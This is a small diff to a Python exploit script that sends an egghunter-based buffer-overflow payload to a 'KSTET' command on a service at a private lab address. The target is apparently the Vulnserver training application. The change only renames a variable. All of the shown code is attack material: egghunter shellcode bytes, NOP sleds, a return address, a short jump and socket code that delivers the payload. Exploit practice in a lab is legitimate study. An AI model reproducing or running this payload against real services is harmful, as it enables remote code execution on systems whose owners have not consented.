@@ -17,7 +17,7 @@ egghunter += b"\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 #mona generic pattern 1000 ##mona findmsp
 junk = "dudedude" + "A"*1000
 
-buffer = "\x90"*18 + egghunter + "\x90"*20 + "\xaf\x11\x50\x62" + "\xeb\xc2\x90\x90" + "X"*4900
+stuff = "\x90"*18 + egghunter + "\x90"*20 + "\xaf\x11\x50\x62" + "\xeb\xc2\x90\x90" + "X"*4900
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -30,7 +30,7 @@ s.close()
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-cmd2 = "KSTET " + buffer
+cmd2 = "KSTET " + stuff
 
 s.connect(('172.16.0.24',9999))
 s.recv(1024)
